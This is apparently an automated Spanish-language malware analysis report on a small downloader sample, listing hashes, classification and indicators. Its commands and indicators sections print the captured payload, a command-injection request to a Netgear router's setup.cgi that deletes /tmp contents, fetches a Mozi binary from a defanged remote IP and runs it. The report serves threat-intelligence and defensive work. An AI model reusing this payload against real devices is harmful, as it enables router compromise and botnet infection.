# 🧬 Payload Analysis

`b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9`

## 📌 Resumen

Texto ASCII de 177 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://196.191.233.XXX:58561/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://196.191.233.XXX:58561/Mozi.m -O /tmp/netge` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9.md](../../../../../malware-like/oraculo/downloader/b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:44:36.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9`
- **MD5:** `99dbfba80480bc4297d36744cd9e8af3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 177 B |
| Entropía | 5.2 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://196.191.233.XXX:58561/Mozi.m+-O+/tmp/netge
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://196.191.233.XXX:58561/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 196.191.233.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://196.191.233.XXX:58561/Mozi.m+-O+/tmp/netge | strings |
| hash | b458ce06edf7c7564eb75f5845c1f5214edfd81b1bc93f7a95b93b6bda8215b9 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
